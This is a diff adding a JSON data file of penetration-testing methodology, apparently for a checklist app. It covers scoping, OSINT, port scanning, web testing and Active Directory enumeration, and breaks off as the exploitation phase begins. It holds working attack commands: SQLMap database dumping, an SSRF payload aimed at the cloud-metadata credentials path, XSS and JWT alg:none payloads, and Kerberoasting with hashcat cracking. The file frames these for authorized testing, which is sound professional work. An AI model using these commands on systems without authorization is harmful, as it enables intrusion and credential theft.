@@ -1,0 +1,1522 @@
+[
+  {
+    "id": "pre",
+    "label": "Pre-Engagement",
+    "short": "Pre",
+    "icon": "\ud83d\udccb",
+    "color": "#3b82f6",
+    "desc": "Legal, scoping, threat modeling, environment setup",
+    "steps": [
+      {
+        "id": "p1",
+        "title": "Initial Client Meeting",
+        "priority": "critical",
+        "summary": "Establish relationship and objectives before any technical work begins.",
+        "checklist": [
+          "Identify stakeholders and primary security contact",
+          "Understand business type, industry, and regulatory environment",
+          "Discuss prior incidents and previous penetration tests",
+          "Identify compliance requirements: PCI-DSS, HIPAA, ISO 27001, SOC 2",
+          "Determine testing type: black-box / grey-box / white-box",
+          "Discuss timeline, budget, and deliverables",
+          "Schedule scope definition follow-up"
+        ],
+        "commands": [
+          {
+            "id": "p1c1",
+            "title": "Pre-Meeting OSINT \u2014 theHarvester",
+            "purpose": "Know their tech stack and employees before the meeting",
+            "cmd": "theHarvester -d {DOMAIN} -b google,bing,linkedin,yahoo,duckduckgo -l 500 -f ~/pentests/{CLIENT}/recon/pre_meeting.html",
+            "example": "theHarvester -d acmecorp.com -b google,bing,linkedin -l 500 -f pre_meeting.html",
+            "flags": [
+              {
+                "f": "-d",
+                "d": "Target domain"
+              },
+              {
+                "f": "-b",
+                "d": "Data sources (comma-separated)"
+              },
+              {
+                "f": "-l 500",
+                "d": "Result limit per source"
+              },
+              {
+                "f": "-f",
+                "d": "HTML output (open in browser)"
+              }
+            ],
+            "note": "Do this before the meeting. Referencing their tech stack builds instant credibility.",
+            "out": "Emails, employee names, subdomains, IPs from public sources"
+          },
+          {
+            "id": "p1c2",
+            "title": "Shodan Pre-Meeting Recon",
+            "purpose": "View public attack surface passively before the call",
+            "cmd": "shodan search 'org:\"{COMPANY}\"' --fields ip_str,port,hostnames,vulns\nshodan host {IP_ADDRESS}",
+            "example": "shodan search 'org:\"Acme Corporation\"' --fields ip_str,port,hostnames,vulns",
+            "flags": [
+              {
+                "f": "org:",
+                "d": "Filter by organization name"
+              },
+              {
+                "f": "ssl:",
+                "d": "Search by SSL cert content"
+              },
+              {
+                "f": "shodan host IP",
+                "d": "Full deep-dive on specific IP"
+              }
+            ],
+            "note": "Setup: pip3 install shodan && shodan init YOUR_API_KEY (free at shodan.io)",
+            "out": "IPs, ports, banners, CVEs \u2014 zero contact with their network"
+          }
+        ],
+        "tools": [
+          "theHarvester",
+          "shodan-cli"
+        ],
+        "deliverable": "Meeting notes + initial scope proposal draft",
+        "tip": "Reference a specific Shodan finding in the meeting. Knowing their exposed RDP before they tell you instantly separates you from junior testers."
+      },
+      {
+        "id": "p2",
+        "title": "Legal Authorization & Scope",
+        "priority": "critical",
+        "summary": "Every scope item in writing. ALL legal docs signed before touching any system.",
+        "checklist": [
+          "All in-scope IP ranges and CIDR blocks documented and signed",
+          "All in-scope domains and subdomains listed",
+          "Out-of-scope systems explicitly documented",
+          "NDA signed by both parties",
+          "Rules of Engagement (ROE) signed by authorized executive",
+          "Written Authorization Letter on company letterhead",
+          "Emergency 24/7 contact list",
+          "Testing hours agreed (business hours / 24-7 / weekends)",
+          "Social engineering in/out of scope confirmed"
+        ],
+        "commands": [
+          {
+            "id": "p2c1",
+            "title": "Verify IP and Domain Ownership",
+            "purpose": "Confirm all scope items belong to the client before testing",
+            "cmd": "whois {IP_ADDRESS} | grep -E 'OrgName|Organization|NetName|CIDR|NetRange'\nwhois {DOMAIN} | grep -E 'Registrant|Organization|Admin'",
+            "example": "whois 203.0.113.10 | grep -E 'OrgName|NetRange'",
+            "flags": [
+              {
+                "f": "grep -E",
+                "d": "Filter to ownership-relevant lines only"
+              }
+            ],
+            "note": "Document this output as part of your legal authorization package. Testing systems you don't own is illegal.",
+            "out": "Organization name, IP block ownership, domain registrant"
+          }
+        ],
+        "tools": [
+          "whois"
+        ],
+        "deliverable": "Signed SOW + NDA + ROE + Authorization Letter",
+        "tip": "Carry the authorization letter at ALL times during testing. If law enforcement contacts you, show it immediately."
+      },
+      {
+        "id": "p3",
+        "title": "Environment Setup",
+        "priority": "high",
+        "summary": "Configure attack machine, logging, and project structure before starting.",
+        "checklist": [
+          "Fresh Kali Linux VM on isolated network",
+          "VM snapshot taken before testing",
+          "Project directory structure created",
+          "Terminal logging enabled",
+          "All tools updated",
+          "SecLists wordlists installed"
+        ],
+        "commands": [
+          {
+            "id": "p3c1",
+            "title": "Project Structure + Terminal Logging",
+            "purpose": "Organized evidence collection and automatic timestamped command log",
+            "cmd": "mkdir -p ~/pentests/{CLIENT}/{recon,scans,exploitation,post-exploit,evidence,loot,report}\ncd ~/pentests/{CLIENT}\n\n# Enable terminal logging:\nscript -a -t 2>terminal_timing.log terminal_session.log\n# Stop: exit  |  Replay: scriptreplay terminal_timing.log terminal_session.log",
+            "example": "mkdir -p ~/pentests/AcmeCorp/{recon,scans,exploitation,post-exploit,evidence,report}",
+            "flags": [
+              {
+                "f": "-p",
+                "d": "Create parent directories"
+              },
+              {
+                "f": "-a",
+                "d": "script: append to log"
+              },
+              {
+                "f": "-t",
+                "d": "script: record timing for replay"
+              }
+            ],
+            "note": "Run script logging at the start of every session. Every command timestamped = your legal and technical evidence.",
+            "out": "Organized project directory + timestamped terminal log"
+          },
+          {
+            "id": "p3c2",
+            "title": "Update Tools + SecLists",
+            "purpose": "Start every engagement with current tools and wordlists",
+            "cmd": "sudo apt update && sudo apt upgrade -y\nsudo apt install -y seclists nmap masscan gobuster ffuf nikto sqlmap hydra crackmapexec impacket-scripts bloodhound neo4j evil-winrm responder\nnuclei -update-templates && subfinder -up && httpx -up",
+            "example": "sudo apt update && sudo apt upgrade -y && sudo apt install -y seclists",
+            "flags": [
+              {
+                "f": "-y",
+                "d": "Auto-confirm all prompts"
+              }
+            ],
+            "note": "Key SecLists: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt | /usr/share/wordlists/rockyou.txt",
+            "out": "All tools updated, SecLists at /usr/share/seclists/"
+          }
+        ],
+        "tools": [
+          "Kali Linux",
+          "VirtualBox/VMware",
+          "SecLists"
+        ],
+        "deliverable": "Setup checklist + clean VM snapshot",
+        "tip": "Take a VM snapshot before starting every engagement. Proves your attack machine state and lets you restore cleanly."
+      }
+    ]
+  },
+  {
+    "id": "recon",
+    "label": "Reconnaissance",
+    "short": "Recon",
+    "icon": "\ud83d\udd0d",
+    "color": "#8b5cf6",
+    "desc": "Passive OSINT + active information gathering",
+    "steps": [
+      {
+        "id": "r1",
+        "title": "Passive OSINT",
+        "priority": "critical",
+        "summary": "Maximum intelligence without touching target systems. Spend at least 2-3 hours here \u2014 completely risk-free.",
+        "checklist": [
+          "DNS record enumeration (A, MX, TXT, NS, SOA, AXFR attempt)",
+          "Certificate transparency \u2014 crt.sh",
+          "Amass passive subdomain enumeration",
+          "Subfinder passive + httpx probe for live hosts",
+          "theHarvester multi-source harvest",
+          "Google dorks: files, panels, sensitive data",
+          "Shodan / Censys passive infrastructure scan",
+          "GitHub / GitLab secret scanning (leaked creds, API keys)",
+          "Wayback Machine \u2014 historical URLs",
+          "LinkedIn + job postings \u2014 tech stack discovery"
+        ],
+        "commands": [
+          {
+            "id": "r1c1",
+            "title": "DNS + crt.sh + Amass + Subfinder + httpx",
+            "purpose": "Complete passive subdomain and DNS enumeration pipeline",
+            "cmd": "# DNS records:\ndnsrecon -d {DOMAIN} -a -o ~/pentests/{CLIENT}/recon/dnsrecon.xml\ndig {DOMAIN} ANY +noall +answer\n\n# Certificate transparency:\ncurl -s 'https://crt.sh/?q=%.{DOMAIN}&output=json' | jq -r '.[].name_value' | sort -u | tee ~/pentests/{CLIENT}/recon/crtsh.txt\n\n# Subdomain enumeration:\namass enum -passive -d {DOMAIN} -o ~/pentests/{CLIENT}/recon/amass.txt\nsubfinder -d {DOMAIN} -all -recursive -o ~/pentests/{CLIENT}/recon/subfinder.txt\n\n# Merge and probe live hosts:\ncat ~/pentests/{CLIENT}/recon/{crtsh,amass,subfinder}.txt | sort -u > all_subs.txt\nhttpx -l all_subs.txt -title -status-code -tech-detect -o ~/pentests/{CLIENT}/recon/live_hosts.txt",
+            "example": "subfinder -d acmecorp.com -all -recursive -o subfinder.txt\nhttpx -l subfinder.txt -title -status-code -tech-detect -o live_hosts.txt",
+            "flags": [
+              {
+                "f": "-a",
+                "d": "dnsrecon: all record types"
+              },
+              {
+                "f": "%.DOMAIN",
+                "d": "crt.sh: wildcard finds all subdomain certs"
+              },
+              {
+                "f": "-passive",
+                "d": "amass: no direct target contact"
+              },
+              {
+                "f": "-all -recursive",
+                "d": "subfinder: all sources + recursive"
+              },
+              {
+                "f": "-tech-detect",
+                "d": "httpx: detect web technologies"
+              }
+            ],
+            "note": "live_hosts.txt is your web attack surface. Every line is a target. crt.sh often finds staging/dev subdomains forgotten by the client.",
+            "out": "All live web hosts with status codes, titles, and technology stacks"
+          },
+          {
+            "id": "r1c2",
+            "title": "theHarvester + GitHub Secrets",
+            "purpose": "Email and employee harvest + leaked credential detection",
+            "cmd": "# theHarvester:\ntheHarvester -d {DOMAIN} -b google,bing,linkedin,yahoo,duckduckgo,crtsh,hackertarget -l 500 -f ~/pentests/{CLIENT}/recon/harvester.html\n\n# GitHub secret scanning:\npip3 install trufflehog --break-system-packages\ntrufflehog github --org={ORG} --token={GITHUB_PAT}\ntrufflehog git https://github.com/{ORG}/{REPO}",
+            "example": "theHarvester -d acmecorp.com -b google,bing,linkedin,crtsh -l 500 -f harvester.html\ntrufflehog github --org=acmecorp --token=ghp_yourtoken",
+            "flags": [
+              {
+                "f": "-b",
+                "d": "Comma-separated sources"
+              },
+              {
+                "f": "-l",
+                "d": "Result limit per source"
+              },
+              {
+                "f": "--org",
+                "d": "Scan entire GitHub organization"
+              },
+              {
+                "f": "--token",
+                "d": "GitHub PAT needed for org scanning"
+              }
+            ],
+            "note": "Emails = password spray list. GitHub leaked API key = critical finding with zero risk. Always check GitHub before touching their network.",
+            "out": "Emails, employees (theHarvester) + leaked secrets with file locations (trufflehog)"
+          },
+          {
+            "id": "r1c3",
+            "title": "Google Dorks + Shodan + Wayback",
+            "purpose": "Sensitive data indexed by search engines, passive infra scan, historical URLs",
+            "cmd": "# Google dorks (paste one at a time):\nsite:{DOMAIN} filetype:pdf OR filetype:xlsx OR filetype:docx\nsite:{DOMAIN} intitle:\"index of\" -html\nsite:{DOMAIN} ext:env OR ext:cfg OR ext:bak OR ext:sql\nsite:{DOMAIN} \"password\" OR \"api_key\" OR \"credentials\"\nsite:{DOMAIN} inurl:admin OR inurl:login OR inurl:dashboard\n\n# Shodan:\nshodan search 'org:\"{COMPANY}\"' --fields ip_str,port,hostnames,vulns\nshodan host {IP_ADDRESS}\n\n# Wayback Machine:\ngo install github.com/tomnomnom/waybackurls@latest\nwaybackurls {DOMAIN} | grep -iE '.php|.asp|.env|.sql|.bak|admin|config|backup' | tee wayback.txt",
+            "example": "site:acmecorp.com ext:env\nshodan search 'org:\"Acme Corporation\"' --fields ip_str,port,hostnames,vulns\nwaybackurls acmecorp.com | grep '.env'",
+            "flags": [
+              {
+                "f": "site:",
+                "d": "Restrict to domain"
+              },
+              {
+                "f": "filetype:/ext:",
+                "d": "Filter by file type"
+              },
+              {
+                "f": "intitle:",
+                "d": "Search page title"
+              },
+              {
+                "f": "inurl:",
+                "d": "Search URL path"
+              }
+            ],
+            "note": "Full dork DB: exploit-db.com/google-hacking-database (4000+ proven dorks). Old .env files often still accessible at historical URLs.",
+            "out": "Exposed docs, login panels, directory listings, config files + historical sensitive URLs"
+          }
+        ],
+        "tools": [
+          "theHarvester",
+          "amass",
+          "subfinder",
+          "httpx",
+          "dnsrecon",
+          "trufflehog",
+          "shodan-cli",
+          "waybackurls"
+        ],
+        "deliverable": "OSINT Report: assets, emails, subdomains, leaked credentials discovered",
+        "tip": "A leaked GitHub API key before touching their network = critical finding with zero risk to you. Always start here."
+      },
+      {
+        "id": "r2",
+        "title": "Active Reconnaissance",
+        "priority": "high",
+        "summary": "Direct contact with target: port scanning, service detection, web enumeration.",
+        "checklist": [
+          "Live host discovery \u2014 ping sweep + TCP fallback",
+          "masscan \u2014 all 65535 TCP ports",
+          "nmap \u2014 service/version on discovered ports",
+          "UDP scan \u2014 top 100 common ports",
+          "gobuster \u2014 web directory brute force",
+          "ffuf \u2014 VHost, param, API fuzzing",
+          "whatweb + wafw00f \u2014 tech and WAF fingerprinting"
+        ],
+        "commands": [
+          {
+            "id": "r2c1",
+            "title": "Host Discovery + masscan + nmap",
+            "purpose": "Find all live hosts and services \u2014 the core scanning workflow",
+            "cmd": "# 1. Host discovery:\nnmap -sn -PE -PS21,22,23,80,443,445,3389 -PU53,161 {CIDR} -oA hosts\ngrep 'Up' hosts.gnmap | awk '{print $2}' > live_ips.txt\n\n# 2. Fast all-port scan:\nsudo masscan {CIDR} -p1-65535 --rate=5000 -oG masscan.txt\ngrep 'open' masscan.txt | awk '{print $4}' | cut -d'/' -f1 | sort -un | paste -sd',' > open_ports.txt\n\n# 3. Deep service scan on discovered ports:\nnmap -p $(cat open_ports.txt) -sV -sC -O --min-rate 3000 -T4 -oA nmap_svc {TARGET}",
+            "example": "sudo masscan 192.168.1.0/24 -p1-65535 --rate=5000 -oG masscan.txt\nnmap -p 22,80,443,445 -sV -sC -O -T4 -oA nmap_svc 192.168.1.100",
+            "flags": [
+              {
+                "f": "-sn",
+                "d": "Ping only (no ports)"
+              },
+              {
+                "f": "-PE -PS",
+                "d": "ICMP + TCP ping (bypasses ICMP blocks)"
+              },
+              {
+                "f": "--rate=5000",
+                "d": "masscan: pkts/sec"
+              },
+              {
+                "f": "-sV",
+                "d": "Service version detection"
+              },
+              {
+                "f": "-sC",
+                "d": "Default safe NSE scripts"
+              },
+              {
+                "f": "-O",
+                "d": "OS detection"
+              },
+              {
+                "f": "-T4",
+                "d": "Aggressive timing"
+              }
+            ],
+            "note": "WORKFLOW: masscan for speed \u2192 extract ports \u2192 nmap for accuracy. Never nmap -p- at default speed on /24 (takes hours).",
+            "out": "All live hosts, open ports, service versions, OS fingerprints"
+          },
+          {
+            "id": "r2c2",
+            "title": "UDP Scan + Web Enumeration",
+            "purpose": "Find UDP services and hidden web directories/VHosts",
+            "cmd": "# UDP scan (never skip this):\nsudo nmap -sU -F --min-rate 1000 -oA udp_scan {TARGET}\n\n# Web directory brute force:\ngobuster dir -u {URL} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,asp,aspx,bak,zip,conf -t 40 -o gobuster.txt\n\n# VHost discovery:\nffuf -u {URL} -H 'Host: FUZZ.{DOMAIN}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs {BASELINE_SIZE}\n\n# Tech + WAF fingerprinting:\nwhatweb -v {URL} | tee whatweb.txt\nwafw00f {URL} -v",
+            "example": "sudo nmap -sU -F --min-rate 1000 -oA udp 192.168.1.100\ngobuster dir -u https://acmecorp.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,bak -t 40",
+            "flags": [
+              {
+                "f": "-sU",
+                "d": "UDP scan (requires root)"
+              },
+              {
+                "f": "-F",
+                "d": "Top 100 UDP ports"
+              },
+              {
+                "f": "-x",
+                "d": "gobuster: file extensions to test"
+              },
+              {
+                "f": "-fs",
+                "d": "ffuf: filter response size (remove false positives)"
+              }
+            ],
+            "note": "UDP 161 (SNMP) with 'public' community = routing tables, ARP cache, running processes, full network map.",
+            "out": "Open UDP services + hidden web paths + virtual hosts + WAF vendor"
+          }
+        ],
+        "tools": [
+          "nmap",
+          "masscan",
+          "gobuster",
+          "ffuf",
+          "whatweb",
+          "wafw00f",
+          "httpx"
+        ],
+        "deliverable": "Asset inventory: IPs, ports, services, web apps, technologies",
+        "tip": "masscan for speed, nmap for accuracy \u2014 always this order. SNMP with public community string is still one of the most reliable network information leaks."
+      }
+    ]
+  },
+  {
+    "id": "scan",
+    "label": "Scanning",
+    "short": "Scan",
+    "icon": "\ud83d\udce1",
+    "color": "#06b6d4",
+    "desc": "Vulnerability scanning, web app testing, Active Directory enumeration",
+    "steps": [
+      {
+        "id": "s1",
+        "title": "Network Vulnerability Scanning",
+        "priority": "critical",
+        "summary": "Automated vuln scans \u2014 authenticated finds 3-5x more. Always push for credentials.",
+        "checklist": [
+          "nmap NSE vulnerability scripts on all hosts",
+          "SMB checks: EternalBlue (MS17-010), PrintNightmare",
+          "SSL/TLS audit: Heartbleed, POODLE, weak ciphers",
+          "SNMP enumeration on UDP 161",
+          "Authenticated Nessus/OpenVAS scan if available",
+          "Manual verify every Critical/High before reporting"
+        ],
+        "commands": [
+          {
+            "id": "s1c1",
+            "title": "nmap NSE Vuln Scan + SMB + SSL",
+            "purpose": "Built-in vulnerability detection \u2014 no additional license required",
+            "cmd": "# General vulnerability scan:\nnmap -sV --script='vuln,safe,auth' -p {PORTS} -oA nmap_vuln {TARGET}\n\n# SMB vulnerability checks:\nnmap --script='smb-vuln*' -p 139,445 {TARGET}\n\n# SSL/TLS audit:\nnmap --script='ssl-enum-ciphers,ssl-heartbleed,ssl-poodle,ssl-dh-params' -p 443,8443 {TARGET}\n\n# SNMP:\nnmap -sU --script=snmp-info --script-args snmpcommunity=public -p 161 {TARGET}",
+            "example": "nmap -sV --script='vuln,safe' -p 22,80,443,445 192.168.1.100 -oA nmap_vuln\nnmap --script='smb-vuln*' -p 139,445 192.168.1.100",
+            "flags": [
+              {
+                "f": "--script=vuln",
+                "d": "All vulnerability detection scripts"
+              },
+              {
+                "f": "--script=safe",
+                "d": "Won't crash services"
+              },
+              {
+                "f": "smb-vuln*",
+                "d": "Wildcard: all SMB vuln scripts"
+              }
+            ],
+            "note": "EternalBlue (MS17-010) VULNERABLE = call client immediately per emergency escalation. Don't proceed without notification.",
+            "out": "CVEs, misconfigurations, default credentials, vulnerable service versions"
+          },
+          {
+            "id": "s1c2",
+            "title": "testssl.sh + SNMP Enumeration",
+            "purpose": "Comprehensive SSL audit and full SNMP data extraction",
+            "cmd": "# Full SSL audit:\ngit clone https://github.com/drwetter/testssl.sh && cd testssl.sh\n./testssl.sh --html ~/pentests/{CLIENT}/scans/ssl.html {TARGET}:443\n./testssl.sh --severity HIGH {TARGET}:443\n\n# SNMP community string brute force:\nonesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt {TARGET}\n\n# SNMP full dump:\nsnmpwalk -v2c -c public {TARGET} . | tee snmp_full.txt",
+            "example": "./testssl.sh --html ssl_audit.html acmecorp.com:443\nsnmpwalk -v2c -c public 192.168.1.1 .",
+            "flags": [
+              {
+                "f": "--html",
+                "d": "Generate HTML report"
+              },
+              {
+                "f": "--severity HIGH",
+                "d": "Show only HIGH/CRITICAL findings"
+              },
+              {
+                "f": "-v2c",
+                "d": "SNMP version 2c"
+              },
+              {
+                "f": "-c public",
+                "d": "Community string (also try: private, manager)"
+              }
+            ],
+            "note": "Common SSL findings: TLS 1.0/1.1, RC4/3DES ciphers, self-signed cert, Heartbleed. SNMP 'public' = full network topology.",
+            "out": "SSL vulnerability list + routing tables, processes, software list (SNMP)"
+          }
+        ],
+        "tools": [
+          "nmap",
+          "testssl.sh",
+          "onesixtyone",
+          "snmpwalk",
+          "Nessus",
+          "OpenVAS"
+        ],
+        "deliverable": "Validated vulnerability list with CVSS scores",
+        "tip": "Never report raw scanner output. Verify every Critical/High manually. One false positive = immediate credibility loss."
+      },
+      {
+        "id": "s2",
+        "title": "Web Application Testing",
+        "priority": "critical",
+        "summary": "OWASP Top 10 \u2014 automated baseline then deep manual analysis with Burp Suite.",
+        "checklist": [
+          "Nikto \u2014 web server misconfiguration scan",
+          "Nuclei \u2014 CVE and template-based scanning",
+          "Security headers audit",
+          "Burp Suite active scan (authenticated)",
+          "SQLi \u2014 all input fields and URL params",
+          "XSS \u2014 reflected, stored, DOM-based",
+          "IDOR \u2014 object ID manipulation",
+          "SSRF \u2014 internal service and cloud metadata",
+          "JWT analysis if tokens present",
+          "CMS scan if WordPress/Drupal detected",
+          "JavaScript file secret scanning"
+        ],
+        "commands": [
+          {
+            "id": "s2c1",
+            "title": "Nikto + Nuclei + Headers",
+            "purpose": "Automated baseline scan \u2014 run first on every web target",
+            "cmd": "# Nikto:\nnikto -h {URL} -o nikto.html -Format htm\n\n# Nuclei:\nnuclei -update-templates\nnuclei -u {URL} -t /root/nuclei-templates/ -severity critical,high,medium -o nuclei.txt -stats\nnuclei -u {URL} -t /root/nuclei-templates/cves/ -o nuclei_cves.txt\n\n# Security headers audit:\ncurl -IsS {URL} | grep -iE 'Content-Security|X-Frame-Options|Strict-Transport|X-Content-Type|Referrer-Policy'",
+            "example": "nikto -h https://acmecorp.com -o nikto.html -Format htm\nnuclei -u https://acmecorp.com -t /root/nuclei-templates/ -severity critical,high -stats",
+            "flags": [
+              {
+                "f": "-Format htm",
+                "d": "Nikto: HTML output"
+              },
+              {
+                "f": "-severity",
+                "d": "nuclei: filter severity level"
+              },
+              {
+                "f": "-stats",
+                "d": "nuclei: show live statistics"
+              },
+              {
+                "f": "-I",
+                "d": "curl: HEAD request (headers only)"
+              }
+            ],
+            "note": "Check /root/nuclei-templates/exposures/ \u2014 exposed panels and config files are often instant wins.",
+            "out": "CVE matches, exposed panels, default creds, misconfigurations, missing security headers"
+          },
+          {
+            "id": "s2c2",
+            "title": "SQLMap + Burp Suite Workflow",
+            "purpose": "SQL injection and comprehensive manual web testing",
+            "cmd": "# SQLMap from Burp request file (most reliable):\nsqlmap -r burp_request.txt --dbs --batch\n\n# SQLMap direct URL:\nsqlmap -u '{URL}?id=1' --dbs --batch -v 1\n\n# Dump table (max 5 rows to prove access):\nsqlmap -u '{URL}?id=1' -D {DB} -T {TABLE} --dump --stop 5 --batch\n\n# Burp Suite proxy setup:\n# Firefox: Settings -> Network -> Manual Proxy -> 127.0.0.1:8080\n# Install Burp CA: browse http://burpsuite -> Download CA -> import in Firefox\n# Ctrl+R = Send to Repeater | Ctrl+I = Send to Intruder\n\n# IDOR test in Repeater:\n# GET /api/users/1234 -> change to /api/users/1235 -> 200 OK = IDOR\n# Auth bypass: {\"role\":\"user\"} -> {\"role\":\"admin\"}\n# SSRF: ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "example": "sqlmap -r burp_login.txt --dbs --batch\nsqlmap -u 'https://acmecorp.com/item?id=1' -D acme_db -T users --dump --stop 5 --batch",
+            "flags": [
+              {
+                "f": "-r",
+                "d": "Read from Burp saved request file (most reliable)"
+              },
+              {
+                "f": "--batch",
+                "d": "Auto-answer all sqlmap prompts"
+              },
+              {
+                "f": "--stop 5",
+                "d": "CRITICAL: 5 rows max \u2014 prove access, never dump PII"
+              },
+              {
+                "f": "--dbs",
+                "d": "Enumerate all databases"
+              }
+            ],
+            "note": "NEVER use --os-shell without explicit written authorization. Proving access = the goal, not extracting all data.",
+            "out": "Database names, tables, sample rows confirming SQL injection"
+          },
+          {
+            "id": "s2c3",
+            "title": "XSS + JWT + WPScan",
+            "purpose": "JavaScript injection, JWT token attacks, and CMS scanning",
+            "cmd": "# XSS payloads (use alert(document.domain) \u2014 never cookie theft):\n# <script>alert(document.domain)</script>\n# \"><img src=x onerror=alert(document.domain)>\nxsstrike -u '{URL}?q=FUZZ' --crawl\n\n# JWT analysis:\npip3 install jwt_tool --break-system-packages\npython3 jwt_tool.py {JWT_TOKEN} -T\npython3 jwt_tool.py {JWT_TOKEN} -X a\nhashcat -m 16500 {JWT_TOKEN} /usr/share/wordlists/rockyou.txt --force\n\n# WordPress:\nwpscan --url {URL} --enumerate ap,at,cb,dbe,u --api-token {TOKEN} -o wpscan.txt",
+            "example": "xsstrike -u 'https://acmecorp.com/search?q=FUZZ' --crawl\npython3 jwt_tool.py eyJhbGc... -X a\nwpscan --url https://acmecorp.com --enumerate ap,at,u --api-token YOUR_TOKEN",
+            "flags": [
+              {
+                "f": "--crawl",
+                "d": "XSSStrike: test all discovered inputs"
+              },
+              {
+                "f": "-X a",
+                "d": "jwt_tool: algorithm confusion (alg:none) attack"
+              },
+              {
+                "f": "-m 16500",
+                "d": "hashcat: JWT HS256 crack mode"
+              },
+              {
+                "f": "--enumerate ap",
+                "d": "wpscan: all plugins with vuln data"
+              }
+            ],
+            "note": "XSS: use alert(document.domain) NOT document.cookie. Prove execution, not steal real cookies.",
+            "out": "XSS firing in browser + JWT admin access + vulnerable WordPress plugins"
+          }
+        ],
+        "tools": [
+          "nikto",
+          "nuclei",
+          "sqlmap",
+          "Burp Suite Pro",
+          "wpscan",
+          "xsstrike",
+          "jwt_tool",
+          "curl"
+        ],
+        "deliverable": "Web app findings with manual verification: request + response + impact per finding",
+        "tip": "Never paste scanner HTML into your report. Rewrite each finding with your own manual evidence. The analysis is what clients pay for."
+      },
+      {
+        "id": "s3",
+        "title": "Active Directory Enumeration",
+        "priority": "high",
+        "summary": "Full Windows domain enumeration \u2014 foundation for all AD attack chains.",
+        "checklist": [
+          "Domain controller and domain name discovery",
+          "User, group, OU enumeration",
+          "Password policy retrieval (critical for spray timing)",
+          "AS-REP Roastable accounts (no pre-auth)",
+          "Kerberoastable service accounts (SPNs set)",
+          "BloodHound collection and attack path analysis",
+          "SMB share enumeration and access testing"
+        ],
+        "commands": [
+          {
+            "id": "s3c1",
+            "title": "CrackMapExec AD Enumeration",
+            "purpose": "Swiss army knife for SMB and Active Directory recon",
+            "cmd": "crackmapexec smb {DC_IP} -u '' -p ''\ncrackmapexec smb {DC_IP} -u {USER} -p '{PASS}' --users | tee ad_users.txt\ncrackmapexec smb {DC_IP} -u {USER} -p '{PASS}' --groups\ncrackmapexec smb {RANGE} -u {USER} -p '{PASS}' --shares\ncrackmapexec smb {DC_IP} -u {USER} -p '{PASS}' --pass-pol",
+            "example": "crackmapexec smb 192.168.1.10 -u 'john.doe' -p 'Password123' --users",
+            "flags": [
+              {
+                "f": "--users",
+                "d": "List all domain users"
+              },
+              {
+                "f": "--groups",
+                "d": "List all domain groups"
+              },
+              {
+                "f": "--shares",
+                "d": "List accessible SMB shares"
+              },
+              {
+                "f": "--pass-pol",
+                "d": "Get password policy (critical for spray timing)"
+              },
+              {
+                "f": "(Pwn3d!)",
+                "d": "Output: you have local admin on that host"
+              }
+            ],
+            "note": "Save --users output as your spray target list. (Pwn3d!) = local admin.",
+            "out": "Domain users, groups, shares, password policy"
+          },
+          {
+            "id": "s3c2",
+            "title": "BloodHound + ldapdomaindump",
+            "purpose": "Visual attack path mapping and full LDAP data extraction",
+            "cmd": "# BloodHound data collection:\npip3 install bloodhound --break-system-packages\npython3 bloodhound.py -d {DOMAIN} -u {USER} -p '{PASS}' -dc {DC_IP} -c all -o ~/pentests/{CLIENT}/scans/bloodhound/\nsudo neo4j console && bloodhound &\n# Import JSON files -> run 'Shortest Paths to Domain Admins'\n\n# Full LDAP dump to HTML:\nldapdomaindump ldap://{DC_IP} -u '{DOMAIN}\\\\{USER}' -p '{PASS}' -o ldap/",
+            "example": "python3 bloodhound.py -d acme.local -u john.doe -p 'Password123' -dc 192.168.1.10 -c all\nldapdomaindump ldap://192.168.1.10 -u 'ACME\\\\john.doe' -p 'Password123' -o ldap/",
+            "flags": [
+              {
+                "f": "-c all",
+                "d": "Collect: Users, Groups, LocalAdmin, Sessions, ACL, Trusts"
+              },
+              {
+                "f": "-d",
+                "d": "Domain FQDN"
+              },
+              {
+                "f": "-dc",
+                "d": "Domain Controller IP"
+              }
+            ],
+            "note": "On Windows domain host: .\\\\SharpHound.exe -c All --OutputDirectory C:\\\\Temp",
+            "out": "Attack graph to Domain Admin (BloodHound) + HTML tables of all AD objects"
+          },
+          {
+            "id": "s3c3",
+            "title": "Kerberoasting + AS-REP Roasting",
+            "purpose": "Get crackable offline hashes \u2014 no network alerts generated",
+            "cmd": "# Kerberoasting (needs valid credentials):\nimpacket-GetUserSPNs {DOMAIN}/{USER}:'{PASS}' -dc-ip {DC_IP} -request -outputfile kerberoast.txt\nhashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force\n\n# AS-REP Roasting (no credentials needed for pre-auth disabled accounts):\nimpacket-GetNPUsers {DOMAIN}/ -usersfile ad_users.txt -no-pass -dc-ip {DC_IP} -outputfile asrep.txt\nhashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force",
+            "example": "impacket-GetUserSPNs acme.local/john.doe:'Password123' -dc-ip 192.168.1.10 -request -outputfile kerberoast.txt",
+            "flags": [
+              {
+                "f": "-request",
+                "d": "Request actual TGS tickets (not just list SPNs)"
+              },
+              {
+                "f": "-m 13100",
+                "d": "hashcat: Kerberos TGS-REP mode"
+              },
+              {
+                "f": "-m 18200",
+                "d": "hashcat: Kerberos AS-REP mode"
+              },
+              {
+                "f": "-no-pass",
+                "d": "AS-REP: no credentials needed"
+              }
+            ],
+            "note": "Service accounts with SPNs often have elevated AD privileges. One cracked service account can equal Domain Admin directly.",
+            "out": "Crackable hash files \u2014 offline cracking with zero network alerts"
+          }
+        ],
+        "tools": [
+          "CrackMapExec",
+          "BloodHound",
+          "bloodhound.py",
+          "ldapdomaindump",
+          "impacket",
+          "neo4j"
+        ],
+        "deliverable": "AD enumeration with BloodHound attack path screenshots",
+        "tip": "BloodHound 'Shortest Paths to Domain Admins' is the most impactful report visual. A 3-hop graph to DA explains the risk instantly to any audience."
+      }
+    ]
+  },
+  {
+    "id": "exploit",
+    "label": "Exploitation",
+    "short": "Exploit",
+    "icon": "\u26a1",
+    "color": "#ef4444",
+    "desc": "Controlled, documented exploitation \u2014 prove impact, cause zero harm",
+    "steps": [
+      {
+        "id": "e1",
+        "title": "Web Application Exploitation",
+        "priority": "critical",
+        "summary": "Exploit confirmed vulnerabilities with benign, documented proof-of-concept only.",
+        "checklist": [
